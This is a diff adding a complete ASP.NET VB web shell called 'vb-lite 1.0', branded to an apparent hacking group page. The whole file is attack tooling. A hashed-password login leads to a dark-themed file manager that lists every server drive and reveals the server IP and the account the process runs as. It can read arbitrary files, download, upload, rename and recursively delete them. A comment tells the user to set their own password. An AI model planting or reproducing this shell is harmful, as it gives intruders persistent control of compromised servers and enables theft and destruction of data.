@@ -1,0 +1,874 @@
+﻿<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Data" %>
+<%@ Import Namespace="System.Text.RegularExpressions" %>
+<%@ Import Namespace="System.Configuration" %>
+<%@ Import Namespace="System.Web" %>
+
+<%@ Page Language="vb" EnableSessionState="False" EnableViewState="False" Strict="True" %>
+
+<html>
+<head>
+    <script language="vb" runat="server">
+        Private _blnFlushContent As Boolean
+
+        Private Const _strRenameTag As String = "_2_"
+        Private Const _strCheckboxTag As String = "checked_"
+        Private Const _strActionTag As String = "action"
+        Private Const _strWebPathTag As String = "path"
+        Private Const _strColSortTag As String = "sort"
+        Private Const _strTargetFolderTag As String = "targetfolder"
+        Private Const _logo As String = "http://www.rehan-manzoor.me/green.png"
+        Private Const _ico As String = "http://www.rehan-manzoor.me/green.ico"
+        Private Const _url As String = "http://www.fb.com/PkInjector"
+        Private Const _name As String = "vb-lite 1.0"
+        Private Const _cookie As String = "vb-lite 1.0"
+        Private Const Password As String = "63f8e3a5b48b8aeb5bd13060e60aaaaa" //replace it with your own pass
+
+        Private _FileOperationException As Exception
+
+
+        Public ReadOnly Property RenameTag() As String
+            Get
+                Return _strRenameTag
+            End Get
+        End Property
+
+        Public ReadOnly Property ActionTag() As String
+            Get
+                Return _strActionTag
+            End Get
+        End Property
+
+        Public ReadOnly Property CheckboxTag() As String
+            Get
+                Return _strCheckboxTag
+            End Get
+        End Property
+
+        Public ReadOnly Property TargetFolderTag() As String
+            Get
+                Return _strTargetFolderTag
+            End Get
+        End Property
+
+        Public ReadOnly Property CurrentWebPath() As String
+            Get
+                Return WebPath()
+            End Get
+        End Property
+
+        Public ReadOnly Property ScriptName() As String
+            Get
+                Return Request.ServerVariables("script_name")
+            End Get
+        End Property
+        
+        
+        Private Sub ShowLogin()
+            Response.Write("<html><head><title>" + _name + "</title>")
+            Response.Write("<link rel=""shortcut icon"" href=""" + _ico + """ />")
+            Response.Write("<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono' rel='stylesheet' type='text/css'>")
+            Response.Write("<style type=""text/css"">")
+            Response.Write("*{font-family: Ubuntu Mono,serif;font-size:95%;}")
+            Response.Write(".path {background: #111 none repeat scroll 0% 0%;border-width: 0px 0px 1px;border-style: none none solid;border-color: -moz-use-text-color -moz-use-text-color #363636;-moz-border-top-colors: none;-moz-border-right-colors: none;-moz-border-bottom-colors: none;-moz-border-left-colors: none;border-image: none;font-size: 12px;color: #FFF;padding: 2px;text-align: center;}")
+            Response.Write(".bt {font-size: 12px;background: #191919 none repeat scroll 0% 0%;color: #4C9CAF;border: 1px solid #222;margin: 0px 4px;}")
+            Response.Write("</style>")
+            Response.Write("</head><body style=""background-color:black;color:#4C9CAF"">")
+            Response.Write("<center>")
+            Response.Write("<form method=""POST"">")
+            Response.Write("<span style=""color:white;""> vb-lite </span><b>1.0 <b>")
+            Response.Write("<input type=""password"" name=""password"" class=""path"">")
+            Response.Write("<input type=""submit"" name=""submit"" value=""Go !"" class=""bt"">")
+            Response.Write("<body></html>")
+            Response.End()
+        End Sub
+        
+        Private Sub TryLogin()
+            Dim pass As String = Request.Form("password")
+            If (Not String.IsNullOrEmpty(pass)) Then
+                pass = FormsAuthentication.HashPasswordForStoringInConfigFile(pass, "MD5").ToLower()
+                If (pass.Equals(Password)) Then
+                    Response.SetCookie(New HttpCookie(_cookie, pass))
+                    Response.Redirect(Request.RawUrl)
+                End If
+            End If
+        End Sub
+        
+        Private Sub Authenticate()
+            TryLogin()
+            If (Request.Cookies.Get(_cookie) Is Nothing) Then
+                ShowLogin()
+            Else
+                Dim pass As String = Request.Cookies(_cookie).Value
+                If (Not pass.Equals(Password)) Then
+                    ShowLogin()
+                End If
+            End If
+        End Sub
+
+        Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+            Authenticate()
+            Dim getAction As String = Request.QueryString("action")
+            If (Not String.IsNullOrEmpty(getAction)) Then
+                If getAction = "view" Then
+                    Dim getFile As String = Request.QueryString("file")
+                    If (Not String.IsNullOrEmpty(getFile)) Then
+                        ViewFile(getFile)
+                    End If
+                ElseIf getAction = "logout" Then
+                    Response.SetCookie(New HttpCookie(_cookie, Nothing))
+                    Response.Redirect(Request.RawUrl)
+                End If
+            End If
+        End Sub
+
+        Public Sub HandleAction()
+            If Request.Form(_strActionTag) Is Nothing Then Return
+
+            Dim strAction As String = Request.Form(_strActionTag).ToLower
+            If strAction = "" Then Return
+            Select Case strAction
+                Case "newfolder"
+                    MakeFolder(GetTargetPath)
+                Case "upload"
+                    SaveUploadedFile()
+                Case Else
+                    ProcessCheckedFiles(strAction)
+            End Select
+            If Not _FileOperationException Is Nothing Then
+                WriteError(_FileOperationException)
+            End If
+        End Sub
+
+
+        Private Sub ProcessCheckedFiles(ByVal strAction As String)
+            Dim intLoc As Integer
+            Dim strName As String
+            Dim intTagLength As Integer = _strCheckboxTag.Length
+            Dim FileList As New ArrayList
+
+            For Each strItem As String In Request.Form
+                intLoc = strItem.IndexOf(_strCheckboxTag)
+                If intLoc > -1 Then
+                    _FileOperationException = Nothing
+                    strName = strItem.Substring(intLoc + intTagLength)
+                    FileList.Add(strName)
+                    Select Case strAction
+                        Case "delete"
+                            DeleteFileOrFolder(strName)
+                        Case "rename"
+                            RenameFileOrFolder(strName)
+                        Case "download"
+                            DownloadFile(strName)
+                    End Select
+                End If
+            Next
+        End Sub
+
+        Private Sub SaveUploadedFile()
+            If Request.Files.Count > 0 Then
+                Dim pf As HttpPostedFile = Request.Files.Item(0)
+                If pf.ContentLength > 0 Then
+                    Dim strFilename As String = pf.FileName
+                    Dim strTargetFile As String = GetLocalPath(Path.GetFileName(strFilename))
+
+                    If File.Exists(strTargetFile) Then
+                        DeleteFileOrFolder(strFilename)
+                    End If
+                    Try
+                        pf.SaveAs(strTargetFile)
+                    Catch ex As Exception
+                        _FileOperationException = ex
+                    End Try
+                End If
+            End If
+        End Sub
+
+
+        Public Sub WriteTable()
+            Dim intRowsRendered As Integer
+            
+            Dim drives As String() = GetDrives()
+            Dim drivesUrl As String
+            For Each s As String In drives
+                drivesUrl += "<a href=""" + ScriptName + "?" + _strWebPathTag + "=" + s + """>[ " + s + " ] </a>&nbsp;"
+            Next
+           
+            
+            
+            With Response
+                .Write("<table name=""top"" class=""header"">")
+                .Write("<tr>")
+                .Write("<td style=""width: 120px; text-align: center;"">")
+                .Write("<a href=" + _url + ">")
+                .Write("<img src=" + _logo + " width=""50"" height=""50"" /><br>" + _name + "</a>")
+                .Write("<td class=""info"">")
+                .Write(ServerVersion)
+                .Write("<br>")
+                .Write("server ip : " + GetServerIP() + "<span class=""split""> | </span> your ip : " + GetClientIP())
+                .Write("<span class=""split""> | </span>user : " + CurrentIdentity() + " <span class=""split"">|</span> ")
+                .Write("<br>")
+                .Write("<br>")
+                .Write(drivesUrl)
+                .Write("<td style=""float:right;"">")
+                .Write("<a href=""" + ScriptName + "?action=logout"">logout</a>")
+                .Write("<tr>")
+                .Write("<td>")
+                .Write("<td style=""text-align:center;"">")
+                .Write("<input type=""file"" class=""bt"" name=""fileupload"" />")
+                .Write("&nbsp;<a href=""javascript:upload();"">")
+                .Write("[ Upload a file ]</a>")
+                .Write("&nbsp; &nbsp;")
+                .Write("<input type=""text"" class=""path"" name=""" & _strTargetFolderTag & """ size=35>")
+                .Write("<a href=""javascript:newfolder();"">")
+                .Write("&nbsp;[ New folder ]</a>")
+                .Write("<td>")
+                .Write("<tr>")
+                .Write("<td>")
+                .Write(UpUrl)
+                .Write("[ Move up a folder ]</a>")
+                .Write("<td style=""text-align:center;"">")
+                .Write("<input type=""text"" name=""path"" class=""path"" style=""width:90%"" value=""" & WebPath() & """>")
+                .Write("&nbsp;&nbsp; <input type=""submit"" class=""bt"" style=""width: 45px;height: 25px;"" value=""Go"">")
+                .Write("<td align=right width=""*""><a href=""#bottom"" title=""end key"">Scroll to Bottom</a>")
+                .Write("</table>")
+                .Write(Environment.NewLine)
+                Flush()
+
+                .Write("<table class=""explorer"">")
+                .Write("<tr class=""special"">")
+                .Write("<td width=""20"">")
+                .Write("<td align=left>" & PageUrl("", "Name") & "File Name</a>")
+                .Write("<td width=80 align=right>" & PageUrl("", "Size") & "Size</a>")
+                .Write("<td width=30 align=left>")
+                .Write("<td width=45 align=right>" & PageUrl("", "Attr") & "Attr</a>")
+                .Write("<td width=150 align=right>" & PageUrl("", "Created") & "Created</a>")
+                .Write("<td width=150 align=right>" & PageUrl("", "Modified") & "Modified</a>")
+                .Write(Environment.NewLine)
+                Flush()
+
+                intRowsRendered = WriteRows()
+                
+                .Write("<tr class=""special"">")
+                .Write("<td><input name=""all_files_checkbox"" onclick=""javascript:checkall(this);"" type=checkbox>")
+                .Write("<td colspan=""5"">")
+                .Write("<a href=""javascript:confirmfiles('download');"">")
+                .Write("[ Download ]</a>")
+                .Write("<a href=""javascript:confirmfiles('delete');"">")
+                .Write("[ Delete ]</a>")
+                .Write("<a href=""javascript:confirmfiles('rename');"">")
+                .Write("[ Rename ]</a>")
+                .Write("<td align=""right"" colspan=""1""><a href=""#top"" title=""end key"">Scroll to Top</a>")
+                .Write("</table>")
+                Flush()
+
+                If intRowsRendered < 0 Then Return
+
+                .Write("<a name=""bottom""></a>")
+            End With
+            Flush()
+        End Sub
+
+        Private Function WriteRows() As Integer
+            Const strPathError As String = "The path '{0}' {1} <a href='javascript:history.go(-1);'>Go back</a>"
+
+            Dim strLocalPath As String = GetLocalPath()
+            If Not Directory.Exists(strLocalPath) Then
+                WriteErrorRow(String.Format(strPathError, WebPath, "does not exist."))
+                Return -1
+            End If
+
+            Dim da As DirectoryInfo()
+            Dim fa As FileInfo()
+            Try
+                Dim di As New DirectoryInfo(strLocalPath)
+                da = di.GetDirectories
+                fa = di.GetFiles
+            Catch ex As Exception
+                WriteErrorRow(ex)
+                Return -1
+            End Try
+
+            Dim dt As DataTable = GetFileInfoTable()
+            dt.BeginLoadData()
+            For Each d As DirectoryInfo In da
+                AddRowToFileInfoTable(d, dt)
+            Next
+            For Each f As FileInfo In fa
+                AddRowToFileInfoTable(f, dt)
+            Next
+            dt.EndLoadData()
+            dt.AcceptChanges()
+
+            If dt.Rows.Count = 0 Then
+                WriteErrorRow("(no files)")
+                Return 0
+            End If
+
+            Dim dv As DataView
+            If SortColumn() = "" Then
+                dv = dt.DefaultView
+            Else
+                dv = New DataView(dt)
+                If SortColumn.StartsWith("-") Then
+                    dv.Sort = "IsFolder, " & SortColumn().Substring(1) & " desc"
+                Else
+                    dv.Sort = "IsFolder desc, " & SortColumn()
+                End If
+            End If
+
+            Dim intRenderedRows As Integer = 0
+            For Each drv As DataRowView In dv
+                If WriteViewRow(drv) Then intRenderedRows += 1
+            Next
+
+            Return intRenderedRows
+        End Function
+
+        Private Function GetFileInfoTable() As DataTable
+            Dim dt As New DataTable
+            With dt.Columns
+                .Add(New DataColumn("Name", GetType(System.String)))
+                .Add(New DataColumn("IsFolder", GetType(System.Boolean)))
+                .Add(New DataColumn("FileExtension", GetType(System.String)))
+                .Add(New DataColumn("Attr", GetType(System.String)))
+                .Add(New DataColumn("Size", GetType(System.Int64)))
+                .Add(New DataColumn("Created", GetType(System.DateTime)))
+                .Add(New DataColumn("Modified", GetType(System.DateTime)))
+            End With
+            Return dt
+        End Function
+
+        Private Sub AddRowToFileInfoTable(ByVal fi As FileSystemInfo, ByVal dt As DataTable)
+            Dim dr As DataRow = dt.NewRow
+            Dim Attr As String = AttribString(fi.Attributes)
+            Dim flag As Boolean = False
+            
+            With dr
+
+                .Item("Name") = fi.Name
+                
+                .Item("FileExtension") = Path.GetExtension(fi.Name)
+                .Item("Attr") = Attr
+                If Attr.IndexOf("d") > -1 Then
+                    .Item("IsFolder") = True
+                    .Item("Size") = 0
+                Else
+                    .Item("IsFolder") = False
+                    .Item("Size") = New FileInfo(fi.FullName).Length
+                End If
+                .Item("Created") = fi.CreationTime
+                .Item("Modified") = fi.LastWriteTime
+            End With
+            dt.Rows.Add(dr)
+        End Sub
+
+
+        Private Function SortColumn() As String
+            If Request.QueryString(_strColSortTag) Is Nothing Then
+                Return "Name"
+            Else
+                Return Request.QueryString(_strColSortTag)
+            End If
+        End Function
+
+        Private Function WebPath() As String
+            Dim strPath As String = Request.Item(_strWebPathTag)
+            If strPath = Nothing OrElse strPath = "" Then
+                strPath = Server.MapPath("~")
+            End If
+            Return strPath
+        End Function
+
+        Private Function UpUrl() As String
+            Dim temp As String = GetLocalPath().Replace("\", "/").Trim(CChar("/"))
+            Dim strUp As String = Regex.Replace(temp, "/[^/]+$", "")
+            If (strUp.IndexOf(CChar("/")) < 0) Then
+                strUp += "/"
+            End If
+            
+            Return PageUrl(strUp)
+        End Function
+
+        Private Function PageUrl(Optional ByVal NewPath As String = "", _
+            Optional ByVal NewSortColumn As String = "") As String
+
+            Dim blnSortProvided As Boolean = (NewSortColumn <> "")
+
+            If NewPath = "" Then NewPath = WebPath()
+            If NewSortColumn = "" Then NewSortColumn = SortColumn()
+
+            Dim sb As New System.Text.StringBuilder
+            With sb
+                .Append("<a href=""")
+                .Append(ScriptName)
+                .Append("?")
+                .Append(_strWebPathTag)
+                .Append("=")
+                .Append(NewPath)
+                If NewSortColumn <> "" Then
+                    .Append("&")
+                    .Append(_strColSortTag)
+                    .Append("=")
+                    If blnSortProvided And (NewSortColumn.ToLower = SortColumn().ToLower) Then
+                        .Append("-")
+                    End If
+                    .Append(NewSortColumn)
+                End If
+                .Append(""">")
+            End With
+
+            Return sb.ToString
+        End Function
+
+        Private Function FormatKB(ByVal FileLength As Long) As String
+            Return String.Format("{0:N0}", (FileLength / 1024))
+        End Function
+
+        Private Function AttribString(ByVal a As IO.FileAttributes) As String
+            Dim sb As New StringBuilder
+            If (a And FileAttributes.ReadOnly) > 0 Then sb.Append("r")
+            If (a And FileAttributes.Hidden) > 0 Then sb.Append("h")
+            If (a And FileAttributes.System) > 0 Then sb.Append("s")
+            If (a And FileAttributes.Directory) > 0 Then sb.Append("d")
+            If (a And FileAttributes.Archive) > 0 Then sb.Append("a")
+            If (a And FileAttributes.Compressed) > 0 Then sb.Append("c")
+            Return sb.ToString
+        End Function
+
+        Private Function WebPathCombine(ByVal path1 As String, ByVal path2 As String) As String
+            Dim strTemp As String = Path.Combine(path1, path2).Replace("\", "/")
+            If strTemp.IndexOf("~/") > -1 Then
+                strTemp = strTemp.Replace("~/", Page.ResolveUrl("~/"))
+            End If
+            Return strTemp
+        End Function
+
+        Private Function WriteViewRow(ByVal drv As DataRowView) As Boolean
+            Dim strFileLink As String
+            Dim strFileName As String = Convert.ToString(drv.Item("Name"))
+            Dim strFilePath As String = WebPathCombine(WebPath, strFileName)
+            Dim blnFolder As Boolean = IsDirectory(drv)
+
+            If blnFolder Then
+                strFileLink = PageUrl(strFilePath) & strFileName & "</a>"
+            Else
+                strFileLink = "<a href=""?action=view&file=" + strFilePath + """ target=""_blank"">" & strFileName & "</a>"
+            End If
+
+            With Response
+                .Write("<tr>")
+                .Write("<td align=right><input name=""")
+                .Write(_strCheckboxTag)
+                .Write(strFileName)
+                .Write(""" type=checkbox>")
+                .Write("<td>")
+                .Write(strFileLink)
+                .Write("<td align=right>")
+                If blnFolder Then
+                    .Write("<td align=left>")
+                Else
+                    .Write(FormatKB(Convert.ToInt64(drv.Item("Size"))))
+                    .Write("<td align=left>kb")
+                End If
+                .Write("<td align=right>")
+                .Write(Convert.ToString(drv.Item("Attr")))
+                .Write("<TD align=right>")
+                .Write(Convert.ToString(drv.Item("Created")))
+                .Write("<td align=right>")
+                .Write(Convert.ToString(drv.Item("Modified")))
+                .Write(Environment.NewLine)
+            End With
+            Flush()
+
+            Return True
+        End Function
+
+        Private Sub Flush()
+            If _blnFlushContent Then Response.Flush()
+        End Sub
+
+
+        Private Function GetLocalPath(Optional ByVal strFilename As String = "") As String
+            Return WebPath() + "/" + strFilename
+        End Function
+
+        Private Function MakeRelativePath(ByVal strFilename As String) As String
+            Dim strRelativePath As String = strFilename.Replace(Server.MapPath(WebPath), "")
+            If strRelativePath.StartsWith("\") Then
+                Return strRelativePath.Substring(1)
+            Else
+                Return strRelativePath
+            End If
+        End Function
+
+        Private Function GetTargetPath(Optional ByVal strFilename As String = "") As String
+            Return Request.Form(_strTargetFolderTag)
+        End Function
+
+        Private Function IsDirectory(ByVal strFilepath As String) As Boolean
+            Return Directory.Exists(strFilepath)
+        End Function
+
+        Private Function IsDirectory(ByVal drv As DataRowView) As Boolean
+            Return Convert.ToString(drv.Item("attr")).IndexOf("d") > -1
+        End Function
+
+        Private Sub DeleteFileOrFolder(ByVal strName As String)
+            Dim strLocalPath As String = GetLocalPath(strName)
+            Try
+                RemoveReadOnly(strLocalPath)
+                If IsDirectory(strLocalPath) Then
+                    Directory.Delete(strLocalPath, True)
+                Else
+                    File.Delete(strLocalPath)
+                End If
+            Catch ex As Exception
+                _FileOperationException = ex
+            End Try
+        End Sub
+
+        
+        Private Sub ViewFile(ByVal strName As String)
+            Dim strLocalPath As String = HttpUtility.UrlDecode(strName)
+            If strLocalPath <> "" Then
+                Dim reader As StreamReader = New StreamReader(strLocalPath)
+                Dim content As String = reader.ReadToEnd()
+                reader.Close()
+                Response.Write("<head><title>" + _name + "</title><link rel=""shortcut icon"" href=" + _ico + " /></head><body style=""background-color:black;""><center><h4><em style=""color:red;"">" + strLocalPath + "</em></h4>")
+                Response.Write("<textarea rows=""30"" cols=""120"" style=""background-color:black;color:green;"">" + HttpUtility.HtmlEncode(content) + "</textarea></center></body>")
+                Response.End()
+                
+            End If
+        End Sub
+        
+        
+        Private Sub DownloadFile(ByVal strName As String)
+            Dim strLocalPath As String = GetLocalPath(strName)
+            If strLocalPath <> "" Then
+                Dim file As System.IO.FileInfo = New System.IO.FileInfo(strLocalPath)
+                If file.Exists Then
+                    Response.Clear()
+                    Response.AddHeader("Content-Disposition", "attachment; filename=" & file.Name)
+                    Response.AddHeader("Content-Length", file.Length.ToString())
+                    Response.ContentType = "application/octet-stream"
+                    Response.WriteFile(file.FullName)
+                    Response.End()
+                End If
+            End If
+        End Sub
+
+        Private Sub RenameFileOrFolder(ByVal strName As String)
+            Dim strOldName As String
+            Dim strNewName As String
+            Dim intTagLoc As Integer = strName.IndexOf(_strRenameTag)
+            If intTagLoc = -1 Then Return
+
+            strOldName = strName.Substring(0, intTagLoc)
+            strNewName = strName.Substring(intTagLoc + _strRenameTag.Length)
+            If strOldName = strNewName Then Return
+
+            Dim strOldPath As String = GetLocalPath(strOldName)
+            Dim strNewPath As String = GetLocalPath(strNewName)
+
+            Try
+                If IsDirectory(strOldPath) Then
+                    Directory.Move(strOldPath, strNewPath)
+                Else
+                    File.Move(strOldPath, strNewPath)
+                End If
+            Catch ex As Exception
+                _FileOperationException = ex
+            End Try
+        End Sub
+
+        Private Sub MakeFolder(ByVal strFilename As String)
+            Dim strLocalPath As String = GetLocalPath(strFilename)
+            Try
+                If Not Directory.Exists(strLocalPath) Then
+                    Directory.CreateDirectory(strLocalPath)
+                End If
+            Catch ex As Exception
+                _FileOperationException = ex
+            End Try
+        End Sub
+
+        Private Sub RemoveReadOnly(ByVal strPath As String)
+            If IsDirectory(strPath) Then
+                For Each strFile As String In Directory.GetFiles(strPath)
+                    RemoveReadOnly(strFile)
+                Next
+                For Each strFolder As String In Directory.GetDirectories(strPath)
+                    RemoveReadOnly(strFolder)
+                Next
+            Else
+                Dim fi As New FileInfo(strPath)
+                If (fi.Attributes And FileAttributes.ReadOnly) <> 0 Then
+                    fi.Attributes = fi.Attributes Xor FileAttributes.ReadOnly
+                End If
+            End If
+        End Sub
+        
+        Private Function GetDrives() As String()
+            Return Environment.GetLogicalDrives()
+        End Function
+
+        Private Function CurrentIdentity() As String
+            Return System.Security.Principal.WindowsIdentity.GetCurrent.Name
+        End Function
+        
+        Private Function ServerVersion() As String
+            Return Request.ServerVariables("SERVER_SOFTWARE")
+        End Function
+        
+        Private Function GetServerIP() As String
+            Return System.Net.Dns.GetHostAddresses(Request.Url.Host)(0).ToString()
+        End Function
+        
+        Private Function GetClientIP() As String
+            Return Request.UserHostAddress
+        End Function
+        
+        Private Function GetFriendlyErrorMessage(ByVal ex As Exception) As String
+            Dim strMessage As String = ex.Message
+            If TypeOf ex Is System.UnauthorizedAccessException Then
+                strMessage &= " The account '" & CurrentIdentity() & "' may not have permission to this file or folder."
+            End If
+            Return strMessage
+        End Function
+
+        Private Sub WriteError(ByVal ex As Exception)
+            WriteError(GetFriendlyErrorMessage(ex))
+        End Sub
+        Private Sub WriteError(ByVal strText As String)
+            Response.Write("<DIV class=""error"">")
+            Response.Write(strText)
+            Response.Write("</DIV>")
+        End Sub
+        Private Sub WriteErrorRow(ByVal ex As Exception)
+            WriteErrorRow(GetFriendlyErrorMessage(ex))
+        End Sub
+        Private Sub WriteErrorRow(ByVal strText As String)
+            Response.Write("<tr><td><td><td colspan=5><DIV class=""error"">")
+            Response.Write(strText)
+            Response.Write("</DIV>")
+        End Sub
+    </script>
+    <title><%=_name%></title>
+    <link rel="shortcut icon" href="<%=_ico%>" />
+    <meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
+    <link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono' rel='stylesheet' type='text/css'>
+    <script type="text/javascript">
+        function newfolder() {
+            if (document.forms[0].elements['<%=TargetFolderTag%>'].value == '') {
+                alert('No folder name was provided. Enter a new folder name in the textbox.');
+                document.forms[0].elements['<%=TargetFolderTag%>'].focus();
+                return;
+            }
+            document.forms[0].action.value = 'newfolder';
+            document.forms[0].submit();
+        }
+
+        function upload() {
+            if (document.forms[0].elements['fileupload'].value == '') {
+                alert('No upload file was provided. Select a file to upload.');
+                document.forms[0].elements['fileupload'].focus();
+                return;
+            }
+            document.forms[0].action.value = 'upload';
+            document.forms[0].submit();
+        }
+
+        function checkall(ctl) {
+            for (var i = 0; i < document.forms[0].elements.length; i++) {
+                if (document.forms[0].elements[i].name.indexOf('<%=CheckboxTag%>') > -1) {
+                    document.forms[0].elements[i].checked = ctl.checked;
+                }
+            }
+        }
+
+        function confirmfiles(sAction) {
+            var nMarked = 0;
+            var sTemp = '';
+            for (var i = 0; i < document.forms[0].elements.length; i++) {
+                if (document.forms[0].elements[i].checked &&
+                 document.forms[0].elements[i].name.indexOf('<%=CheckboxTag%>') > -1) {
+                    if (sAction == 'rename') {
+                        var sFilename = '';
+                        var sNewFilename = '';
+                        sFilename = document.forms[0].elements[i].name;
+                        sFilename = sFilename.replace('<%=CheckboxTag%>', '');
+                        sNewFilename = prompt('Enter new name for ' + sFilename, sFilename);
+                        if (sNewFilename != null) {
+                            document.forms[0].elements[i].name = document.forms[0].elements[i].name + '<%=RenameTag%>' + sNewFilename;
+                        }
+                    }
+                    if (sAction == 'download') {
+                        document.forms[0].action.value = sAction;
+                        document.forms[0].submit();
+                        return;
+                    }
+                    nMarked = nMarked + 1;
+                }
+            }
+            if (nMarked == 0) {
+                alert('No items selected. To select items, use the checkboxes on the left.');
+                return;
+            }
+            sTemp = 'Are you sure that you want to ' + sAction + ' the ' + nMarked + ' checked item(s)?'
+            if (sAction == 'copy' || sAction == 'move') {
+                sTemp = 'Are you sure you want to ' + sAction + ' the ' + nMarked + ' checked item(s) to the "' + document.forms[0].elements['<%=TargetFolderTag%>'].value + '" folder?'
+                if (document.forms[0].elements['<%=TargetFolderTag%>'].value == '') {
+                    document.forms[0].elements['<%=TargetFolderTag%>'].focus();
+                    alert('No destination folder provided. Enter a folder name.');
+                    return;
+                }
+            }
+            var confirmed = false;
+            if (sAction == 'rename') {
+                confirmed = true;
+            } else {
+                confirmed = confirm(sTemp);
+            }
+
+            if (confirmed) {
+                document.forms[0].action.value = sAction;
+                document.forms[0].submit();
+            }
+
+        }
+    </script>
+    <style type="text/css">
+        * {
+            font-family: Ubuntu Mono,serif;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            border: 0;
+        }
+
+        .path {
+            background: #111 none repeat scroll 0% 0%;
+            border-width: 0px 0px 1px;
+            border-style: none none solid;
+            border-color: -moz-use-text-color -moz-use-text-color #363636;
+            -moz-border-top-colors: none;
+            -moz-border-right-colors: none;
+            -moz-border-bottom-colors: none;
+            -moz-border-left-colors: none;
+            border-image: none;
+            font-size: 12px;
+            color: #FFF;
+            padding: 2px;
+            text-align: center;
+        }
+
+        .bt {
+            border-color: #b0b0b0;
+            background: #3d3d3d;
+            color: #ffffff;
+            font: 12px Arial,Tahoma;
+        }
+
+        body {
+            font-size: 70%;
+            margin-top: 10px;
+            margin-left: 20px;
+            margin-right: 20px;
+            background-color: black;
+            color: white;
+        }
+
+        #main {
+            background-color: #0A090B;
+            border-radius: 6px;
+            padding: 4px;
+        }
+
+        .explorer {
+            width: 100%;
+            padding: 5px;
+            border: 1px solid #4C9CAF;
+            border-radius: 6px;
+            color: #6E6C71;
+            background-color: #0A090B;
+        }
+
+        a {
+            color: #4C9CAF;
+            text-decoration: none;
+        }
+
+        .split {
+            color: #4C9CAF;
+        }
+
+        table {
+            width: 100%;
+        }
+
+        td {
+            font-size: 75%;
+        }
+
+        .header {
+            padding: 5px;
+            margin-bottom: 2px;
+        }
+
+        .footer {
+            margin-top: 2px;
+            border: 1px solid #4C9CAF;
+            border-radius: 6px;
+            background-color: black;
+            padding: 5px;
+        }
+
+        .error {
+            color: red;
+            font-weight: bold;
+        }
+
+        .special {
+            background: #222 none repeat scroll 0% 0%;
+            padding: 6px 8px;
+        }
+
+        .explorer th {
+            background: #222 none repeat scroll 0% 0%;
+            padding: 6px 8px;
+        }
+
+        .explorer a {
+            text-decoration: none;
+        }
+
+        .explorer td {
+            border-bottom: 1px solid #222;
+            line-height: 24px;
+            padding: 0px 8px;
+            vertical-align: top;
+        }
+
+        .explorer tr:hover {
+            background: #191919;
+        }
+
+        .info {
+            border-left: 1px solid #4C9CAF;
+            margin: 6px;
+            padding: 2px 0px 0px 16px;
+        }
+    </style>
+</head>
+<body>
+    <%HandleAction()%>
+    <form action="<%=ScriptName%>" method="post" enctype="multipart/form-data">
+        <input type="hidden" name="<%=ActionTag%>">
+        <div id="main">
+            <%WriteTable()%>
+        </div>
+    </form>
+</body>
+</html>
